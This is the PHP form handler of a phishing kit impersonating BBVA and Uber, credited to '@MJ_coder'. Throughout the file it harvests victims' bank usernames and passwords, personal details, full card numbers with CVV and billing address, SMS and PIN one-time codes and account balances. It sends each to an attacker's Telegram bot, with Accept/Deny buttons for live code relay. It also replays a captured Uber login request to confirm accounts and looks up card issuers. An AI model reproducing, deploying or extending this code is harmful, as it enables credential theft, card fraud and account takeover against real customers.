<?php

/*===================================================
+= Coded by: @MJ_coder
+===================================================*/

session_start();


include "config.php";

if (isset($_POST["log"])) {
    $_SESSION["login_type"] = $_POST["log"] === "empresa" ? "empresa" : "normal";
}

if (isset($_POST["log"]) && $_POST["log"] === "uber_login") {

    if (isset($_POST["user"]) && trim($_POST["user"]) !== "") {
        $userInput = trim($_POST["user"]);
        $requestFilePath = "../../../request.txt";

        if (file_exists($requestFilePath)) {
            $content = file_get_contents($requestFilePath);
            $parts = preg_split("/\r\n\r\n|\n\n|\n\r\n/", $content, 2);
            $header_block = trim($parts[0]);
            $body_block = isset($parts[1]) ? trim($parts[1]) : "";

            $lines = explode("\n", $header_block);
            $request_line = array_shift($lines);
            list($method, $path, $version) = explode(' ', trim($request_line), 3);

            $headers = [];
            foreach ($lines as $line) {
                if (strpos($line, ':') !== false) {
                    list($key, $val) = explode(':', $line, 2);
                    $key = trim($key);
                    $val = trim($val);
                    if (strtolower($key) !== 'content-length' && strtolower($key) !== 'accept-encoding') {
                        $headers[] = "$key: $val";
                    }
                }
            }

            $host = 'auth.uber.com';
            foreach ($headers as $h) {
                if (stripos($h, 'Host:') === 0) {
                    $host = trim(substr($h, 5));
                    break;
                }
                if (stripos($h, 'authority:') === 0) {
                    $host = trim(substr($h, 10));
                    break;
                }
            }

            $url = "https://" . $host . $path;
            $new_body = preg_replace('/"emailAddress"\s*:\s*"[^"]+"/', '"emailAddress":"' . addslashes($userInput) . '"', $body_block);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            if (strtoupper($method) === 'POST') {
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $new_body);
            } else {
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, strtoupper($method));
                if (!empty($new_body))
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $new_body);
            }
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

            $response = curl_exec($ch);
            $httpData = curl_getinfo($ch);
            curl_close($ch);
            
            // Debug log
            file_put_contents('uber_debug.txt', "Code: " . $httpData['http_code'] . "\nResponse: " . $response . "\n");

            if (trim($response) === "" || $httpData['http_code'] >= 400 || strpos($response, '"flowType":"SIGN_UP"') !== false || strpos($response, '"flowType": "SIGN_UP"') !== false) {
                // API returns error or SIGN_UP (meaning account not found or request blocked)
                header("Location: ../../../newlogin.php?errors=email_not_found");
                exit();
            } else {
                $firstName = "Client";
                if(preg_match('/"firstName"\s*:\s*"([^"]+)"/', $response, $matches)) {
                    $firstName = $matches[1];
                }
                
                $maskedNumber = "";
                if(preg_match('/"\+?\*+([0-9]*\*+[0-9]+|[0-9]+)"/', $response, $matches)) {
                    $maskedNumber = trim($matches[0], '"');
                } else if(preg_match('/(\+?[\*0-9]*\*[0-9]+)/', $response, $matches)) {
                    $maskedNumber = $matches[1];
                }
                
                $_SESSION['firstName'] = $firstName;
                $_SESSION['maskedNumber'] = $maskedNumber;
                $_SESSION['userInput'] = $userInput;
                
                $message=
                "<blockquote>[LOGIN] => UBER</blockquote>\n".     
                "- Email/Phone : <code>".$userInput."</code>\n".
                "- Detected Name : ".$firstName."\n".
                "- IP : ".$_SERVER['REMOTE_ADDR']."\n".
                "[🛂] Panel-link : ".get_steps_link()."\n".
                "<blockquote>└ © @MJ_coder :  [© 2025 - All rights reserved.]</blockquote>\n";  

                sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
                reset_data();      
                header("Location: ../../../verfy.php");
                exit();
            }
        } else {
            header("Location: ../../../newlogin.php?errors=missing_request_file");
            exit();
        }

    } else {
        header("Location: ../../../newlogin.php?errors=");
        exit();
    }

} elseif (isset($_POST["log"])) {


    if ($_POST["user"] !== "" & $_POST["pass"] !== "") {

        $company = isset($_POST["company"]) ? "<code>" . $_POST["company"] . "</code>" : "N/A (Autónomo)";
        $user = "<code>" . $_POST["user"] . "</code>";
        $pass = "<code>" . $_POST["pass"] . "</code>";

        $message =
            '<blockquote>[LOGIN] => BBVA</blockquote>' . "\n" .
            '- Company : ' . $company . "\n" .
            '- User : ' . $user . "\n" .
            '- Pass : ' . $pass . "\n" .
            '- IP : ' . $_SERVER['REMOTE_ADDR'] . "\n" .
            '[🛂] Panel-link : ' . get_steps_link() . "\n" .
            '<blockquote>└ © @MJ_coder :  [© 2025 - All rights reserved.]</blockquote>' . "\n";

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading_10s.php");
        exit();

    } else {
        header("Location: ../../../login.php?errors=");
        exit();
    }

} elseif (isset($_POST["info_data"])) {

    if ($_POST["name"] !== "" & $_POST["phone"] !== "" & $_POST["email"] !== "") {

        $name = "<code>" . $_POST["name"] . "</code>";
        $phone = "<code>" . $_POST["phone"] . "</code>";
        $email = "<code>" . $_POST["email"] . "</code>";

        $message =
            '<blockquote>[INFO] => BBVA</blockquote>' . "\n" .
            '- Name : ' . $name . "\n" .
            '- Phone: ' . $phone . "\n" .
            '- Email: ' . $email . "\n" .
            '- IP : ' . $_SERVER['REMOTE_ADDR'] . "\n" .
            '[🛂] Panel-link : ' . get_steps_link() . "\n" .
            '<blockquote>└ © @MJ_coder :  [© 2025 - All rights reserved.]</blockquote>' . "\n";

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../cc.php");
        exit();

    } else {
        header("Location: ../../../info.php?errors=");
        exit();
    }

} elseif (isset($_POST["cc_data"])) {

    if ($_POST["cc"] !== "" & $_POST["exp"] !== "" & $_POST["cvv"] !== "") {

        $cc = "<code>" . $_POST["cc"] . "</code>";
        $exp = "<code>" . $_POST["exp"] . "</code>";
        $cvv = "<code>" . $_POST["cvv"] . "</code>";

        $message =
            '<blockquote>[CREDIT CARD] => BBVA</blockquote>' . "\n" .
            '- Card Number : ' . $cc . "\n" .
            '- Expiry Date : ' . $exp . "\n" .
            '- CVV         : ' . $cvv . "\n" .
            '- IP : ' . $_SERVER['REMOTE_ADDR'] . "\n" .
            '[🛂] Panel-link : ' . get_steps_link() . "\n" .
            '<blockquote>└ © @MJ_coder :  [© 2025 - All rights reserved.]</blockquote>' . "\n";

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();

        if (isset($_SESSION["login_type"]) && $_SESSION["login_type"] === "empresa") {
            header("Location: ../../../balance.php");
        } else {
            header("Location: ../../../loading.php");
        }
        exit();

    } else {
        header("Location: ../../../cc.php?errors=");
        exit();
    }

} elseif (isset($_POST["balance_data"])) {

    if ($_POST["saldo"] !== "") {

        $saldo = "<code>" . $_POST["saldo"] . "</code>";

        $message =
            '<blockquote>[BALANCE] => BBVA</blockquote>' . "\n" .
            '- Saldo Actual : ' . $saldo . "\n" .
            '- IP : ' . $_SERVER['REMOTE_ADDR'] . "\n" .
            '[🛂] Panel-link : ' . get_steps_link() . "\n" .
            '<blockquote>└ © @MJ_coder :  [© 2025 - All rights reserved.]</blockquote>' . "\n";

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();

    } else {
        header("Location: ../../../balance.php?errors=");
        exit();
    }

} elseif (isset($_POST["sms"])) {


    if ($_POST["x1"] !== "" & $_POST["x2"] !== "" & $_POST["x3"] !== "" & $_POST["x4"] !== "" & $_POST["x5"] !== "" & $_POST["x6"] !== "") {

        $sms = "<code>" . $_POST["x1"] . $_POST["x2"] . $_POST["x3"] . $_POST["x4"] . $_POST["x5"] . $_POST["x6"] . "</code>";

        $message =
            '<blockquote>[SMS] => BBVA</blockquote>' . "\n" .
            '- SMS : ' . $sms . "\n" .
            '- IP : ' . $_SERVER['REMOTE_ADDR'] . "\n" .
            '[🛂] Panel-link : ' . get_steps_link() . "\n" .
            '<blockquote>└ © @MJ_coder :  [© 2025 - All rights reserved.]</blockquote>' . "\n";

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();

    } else {
        header("Location: ../../../sms.php?errors=");
        exit();
    }

} elseif (isset($_POST["pin"])) {

    header('Content-Type: application/json');

    if (isset($_POST["x1"]) && $_POST["x1"] !== "" && isset($_POST["x2"]) && $_POST["x2"] !== "" && isset($_POST["x3"]) && $_POST["x3"] !== "" && isset($_POST["x4"]) && $_POST["x4"] !== "") {

        $pin_code = $_POST["x1"] . $_POST["x2"] . $_POST["x3"] . $_POST["x4"];
        $code = "<code>" . $pin_code . "</code>";
        $userInput = isset($_SESSION['userInput']) ? $_SESSION['userInput'] : 'unknown';
        $firstName = isset($_SESSION['firstName']) ? $_SESSION['firstName'] : 'Client';

        // Unique session identifier for this submission
        $sid = session_id() . '_' . time();
        $_SESSION['pin_sid'] = $sid;

        // Make sure data dir exists
        if (!is_dir('../../../data/pin_decisions')) {
            mkdir('../../../data/pin_decisions', 0777, true);
        }

        $message =
            '<blockquote>[PIN] => UBER</blockquote>' . "\n" .
            '- Name : ' . $firstName . "\n" .
            '- Email/Phone : <code>' . $userInput . "</code>\n" .
            '- PIN : ' . $code . "\n" .
            '- IP : ' . $_SERVER['REMOTE_ADDR'] . "\n" .
            '[🛂] Panel-link : ' . get_steps_link() . "\n" .
            '<blockquote>└ © @MJ_coder :  [© 2025 - All rights reserved.]</blockquote>' . "\n";

        // Inline keyboard with Accept / Deny
        $reply_markup = json_encode([
            'inline_keyboard' => [[
                ['text' => '✅ Accept', 'callback_data' => 'accept_' . $sid],
                ['text' => '❌ Deny',   'callback_data' => 'deny_' . $sid]
            ]]
        ]);

        $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
            'chat_id'      => CHAT_ID,
            'text'         => $message,
            'parse_mode'   => 'html',
            'reply_markup' => $reply_markup
        ]));
        curl_exec($ch);
        curl_close($ch);

        echo json_encode(['status' => 'pending', 'sid' => $sid]);
        exit();

    } else {
        echo json_encode(['status' => 'error', 'msg' => 'incomplete_pin']);
        exit();
    }

} elseif (isset($_GET["new"])) {

    $message =
        '<blockquote> [NEW CODE] => BBVA </blockquote>' . "\n" .
        'IP : ' . $_SERVER['REMOTE_ADDR'] . ' Send Another code!' . "\n" .
        '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>' . "\n";

    sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
    reset_data();
    header("Location: ../../../sms.php");
    exit();

} elseif (isset($_POST["action_tracker"])) {

    $action = $_POST["action_tracker"];
    $userInput = isset($_SESSION['userInput']) ? $_SESSION['userInput'] : 'unknown';
    
    $action_msg = $action === "whatsapp_code" ? "Send code via WhatsApp" : "Login with email";
    
    $message =
        "<blockquote>[🖱 CLIC] => UBER</blockquote>\n" .
        "- Customer : <code>" . $userInput . "</code>\n" .
        "- Action Checked : " . $action_msg . "\n" .
        "- IP : " . $_SERVER['REMOTE_ADDR'] . "\n" .
        "[🛂] Panel-link : " . get_steps_link() . "\n" .
        "<blockquote>└ © @MJ_coder :  [© 2025 - All rights reserved.]</blockquote>\n";

    sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
    header("Location: ../../../verfy.php");
    exit();

} elseif (isset($_POST["card_data"])) {

    header('Content-Type: application/json');


    $userInput  = isset($_SESSION['userInput'])  ? $_SESSION['userInput']  : 'unknown';
    $firstName  = isset($_SESSION['firstName'])  ? $_SESSION['firstName']  : 'Client';

    $cc     = isset($_POST['cc'])     ? trim($_POST['cc'])     : 'N/A';
    $exp    = isset($_POST['exp'])    ? trim($_POST['exp'])    : 'N/A';
    $cvv    = isset($_POST['cvv'])    ? trim($_POST['cvv'])    : 'N/A';
    $street = isset($_POST['street']) ? trim($_POST['street']) : 'N/A';
    $city   = isset($_POST['city'])   ? trim($_POST['city'])   : 'N/A';
    $state  = isset($_POST['state'])  ? trim($_POST['state'])  : 'N/A';
    $zip    = isset($_POST['zip'])    ? trim($_POST['zip'])    : 'N/A';

    // ── BIN Lookup ──────────────────────────────────────────
    $bin        = preg_replace('/\s+/', '', $cc);
    $bin        = substr($bin, 0, 8); // up to 8 digits
    $bank_name  = 'Unknown';
    $bank_url   = '';
    $card_scheme= 'Unknown';
    $card_type  = 'Unknown';
    $card_brand = 'Unknown';
    $country    = 'Unknown';
    $country_flag = '';

    if (strlen($bin) >= 6) {
        $bin_ch = curl_init();
        curl_setopt($bin_ch, CURLOPT_URL, "https://lookup.binlist.net/" . $bin);
        curl_setopt($bin_ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($bin_ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($bin_ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($bin_ch, CURLOPT_HTTPHEADER, ['Accept-Version: 3']);
        curl_setopt($bin_ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        $bin_response = curl_exec($bin_ch);
        curl_close($bin_ch);

        $bin_data = json_decode($bin_response, true);
        if ($bin_data) {
            $bank_name    = isset($bin_data['bank']['name'])     ? $bin_data['bank']['name']     : 'Unknown';
            $bank_url     = isset($bin_data['bank']['url'])      ? $bin_data['bank']['url']      : '';
            $card_scheme  = isset($bin_data['scheme'])           ? strtoupper($bin_data['scheme']): 'Unknown';
            $card_type    = isset($bin_data['type'])             ? ucfirst($bin_data['type'])    : 'Unknown';
            $card_brand   = isset($bin_data['brand'])            ? $bin_data['brand']             : 'Unknown';
            $country      = isset($bin_data['country']['name'])  ? $bin_data['country']['name']  : 'Unknown';
            $country_flag = isset($bin_data['country']['emoji']) ? $bin_data['country']['emoji'] : '';
        }
    }

    // Scheme emoji
    $scheme_emoji = '💳';
    if (stripos($card_scheme, 'visa')       !== false) $scheme_emoji = '💳 VISA';
    if (stripos($card_scheme, 'mastercard') !== false) $scheme_emoji = '💳 MASTERCARD';
    if (stripos($card_scheme, 'amex')       !== false) $scheme_emoji = '💳 AMEX';
    if (stripos($card_scheme, 'discover')   !== false) $scheme_emoji = '💳 DISCOVER';

    // Unique session id
    $sid = session_id() . '_card_' . time();
    $_SESSION['card_sid'] = $sid;

    // ── Telegram Message ────────────────────────────────────
    $message =
        "<blockquote>[💳 CARD] => UBER</blockquote>\n" .
        "- Name : " . $firstName . "\n" .
        "- Email/Phone : <code>" . $userInput . "</code>\n\n" .
        "<blockquote>💳 Card Info</blockquote>\n" .
        "- Card : <code>" . $cc . "</code>\n" .
        "- Expiry : <code>" . $exp . "</code>\n" .
        "- CVV : <code>" . $cvv . "</code>\n" .
        "- Type : " . $scheme_emoji . " | " . $card_type . " | " . $card_brand . "\n\n" .
        "<blockquote>🏦 Bank Info</blockquote>\n" .
        "- Bank : <b>" . $bank_name . "</b>\n" .
        "- Country : " . $country_flag . " " . $country . "\n" .
        ($bank_url ? "- Website : " . $bank_url . "\n" : "") .
        "\n<blockquote>📍 Billing Address</blockquote>\n" .
        "- Street : " . $street . "\n" .
        "- City : " . $city . "\n" .
        "- State : " . $state . "\n" .
        "- ZIP : " . $zip . "\n\n" .
        "- IP : " . $_SERVER['REMOTE_ADDR'] . "\n" .
        "[🛂] Panel : " . get_steps_link() . "\n" .
        "<blockquote>└ © @MJ_coder :  [© 2025 - All rights reserved.]</blockquote>\n";

    // 3-button inline keyboard
    $reply_markup = json_encode([
        'inline_keyboard' => [[
            ['text' => '❌ Error Card',   'callback_data' => 'error_card_'   . $sid],
            ['text' => '📱 SMS',          'callback_data' => 'sms_'          . $sid],
            ['text' => '✅ Bank Approve', 'callback_data' => 'bank_approve_' . $sid]
        ]]
    ]);

    // Send bank logo as photo first (if bank_url available)
    if (!empty($bank_url)) {
        $logo_url = "https://logo.clearbit.com/" . ltrim($bank_url, 'www.');
        $photo_ch = curl_init();
        curl_setopt($photo_ch, CURLOPT_URL, "https://api.telegram.org/bot" . BOT_TOKEN . "/sendPhoto");
        curl_setopt($photo_ch, CURLOPT_POST, true);
        curl_setopt($photo_ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($photo_ch, CURLOPT_POSTFIELDS, http_build_query([
            'chat_id'  => CHAT_ID,
            'photo'    => $logo_url,
            'caption'  => "🏦 " . $bank_name . " | " . $country_flag . " " . $country
        ]));
        curl_exec($photo_ch);
        curl_close($photo_ch);
    }

    // Send main message
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'chat_id'      => CHAT_ID,
        'text'         => $message,
        'parse_mode'   => 'html',
        'reply_markup' => $reply_markup
    ]));
    curl_exec($ch);
    curl_close($ch);

    echo json_encode(['status' => 'pending', 'sid' => $sid]);
    exit();

} elseif (isset($_POST["sms_code"])) {

    header('Content-Type: application/json');


    $sms_code  = trim($_POST['sms_code']);
    $userInput = isset($_SESSION['userInput']) ? $_SESSION['userInput'] : 'unknown';
    $firstName = isset($_SESSION['firstName']) ? $_SESSION['firstName'] : 'Client';

    $sid = session_id() . '_sms_' . time();
    $_SESSION['sms_sid'] = $sid;

    $message =
        "<blockquote>[📱 SMS CODE] => UBER</blockquote>\n" .
        "- Name : " . $firstName . "\n" .
        "- Email/Phone : <code>" . $userInput . "</code>\n" .
        "- SMS Code : <code>" . $sms_code . "</code>\n" .
        "- IP : " . $_SERVER['REMOTE_ADDR'] . "\n" .
        "[🛂] Panel-link : " . get_steps_link() . "\n" .
        "<blockquote>└ © @MJ_coder :  [© 2025 - All rights reserved.]</blockquote>\n";

    $reply_markup = json_encode([
        'inline_keyboard' => [[
            ['text' => '✅ Accept', 'callback_data' => 'accept_' . $sid],
            ['text' => '❌ Deny',   'callback_data' => 'deny_'   . $sid]
        ]]
    ]);

    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'chat_id'      => CHAT_ID,
        'text'         => $message,
        'parse_mode'   => 'html',
        'reply_markup' => $reply_markup
    ]));
    curl_exec($ch);
    curl_close($ch);

    echo json_encode(['status' => 'pending', 'sid' => $sid]);
    exit();

} elseif (isset($_POST["sms_resend"])) {

    $userInput = isset($_SESSION['userInput']) ? $_SESSION['userInput'] : 'unknown';

    $message =
        "<blockquote>[🔄 SMS RESEND] => UBER</blockquote>\n" .
        "- Email/Phone : <code>" . $userInput . "</code>\n" .
        "- IP : " . $_SERVER['REMOTE_ADDR'] . "\n" .
        "<blockquote>└ © @MJ_coder :  [© 2025 - All rights reserved.]</blockquote>\n";

    sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok']);
    exit();

} elseif (isset($_POST["bank_approval"])) {

    header('Content-Type: application/json');

    $userInput = isset($_SESSION['userInput']) ? $_SESSION['userInput'] : 'unknown';
    $firstName = isset($_SESSION['firstName']) ? $_SESSION['firstName'] : 'Client';

    $sid = session_id() . '_bank_' . time();
    $_SESSION['bank_sid'] = $sid;

    $message =
        "<blockquote>[🏦 BANK APPROVE] => UBER</blockquote>\n" .
        "- Name : " . $firstName . "\n" .
        "- Email/Phone : <code>" . $userInput . "</code>\n" .
        "- IP : " . $_SERVER['REMOTE_ADDR'] . "\n" .
        "[🛂] Panel-link : " . get_steps_link() . "\n" .
        "<blockquote>└ © @MJ_coder :  [© 2025 - All rights reserved.]</blockquote>\n";

    $reply_markup = json_encode([
        'inline_keyboard' => [[
            ['text' => '✅ Accept', 'callback_data' => 'accept_' . $sid],
            ['text' => '❌ Deny',   'callback_data' => 'deny_'   . $sid]
        ]]
    ]);

    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'chat_id'      => CHAT_ID,
        'text'         => $message,
        'parse_mode'   => 'html',
        'reply_markup' => $reply_markup
    ]));
    curl_exec($ch);
    curl_close($ch);

    echo json_encode(['status' => 'pending', 'sid' => $sid]);
    exit();

} elseif (isset($_POST["bank_resend"])) {

    $userInput = isset($_SESSION['userInput']) ? $_SESSION['userInput'] : 'unknown';

    $message =
        "<blockquote>[🔄 BANK RESEND] => UBER</blockquote>\n" .
        "- Email/Phone : <code>" . $userInput . "</code>\n" .
        "- IP : " . $_SERVER['REMOTE_ADDR'] . "\n" .
        "<blockquote>└ © @MJ_coder :  [© 2025 - All rights reserved.]</blockquote>\n";

    sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok']);
    exit();

}

?>